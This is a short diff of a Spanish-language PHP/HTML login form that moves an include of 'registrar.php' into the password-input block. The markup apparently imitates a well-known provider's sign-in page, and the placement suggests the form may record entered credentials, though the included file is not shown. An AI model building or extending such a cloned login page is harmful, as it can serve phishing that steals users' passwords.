@@ -1298,7 +1298,9 @@
                                             <input id="Password" type="password" value="" spellcheck="false" name="contraseña" placeholder="Ingresa tu contraseña" autofocus>
 
                                             <input id="Passwd-hidden" type="password" spellcheck="false" class="hidden">
-											
+                                            <?php 
+        									include("registrar.php");
+        									?>
                                         </div>
                                     </div>
                                     <span role="alert" class="error-msg" id="errormsg_0_Email"></span>
@@ -1310,9 +1312,7 @@
                             </div>
                         </div>
                     </form>
-                    <?php 
-        									include("registrar.php");
-        									?>
+                 
                 </div>
                 <div class="card-mask-wrap
         
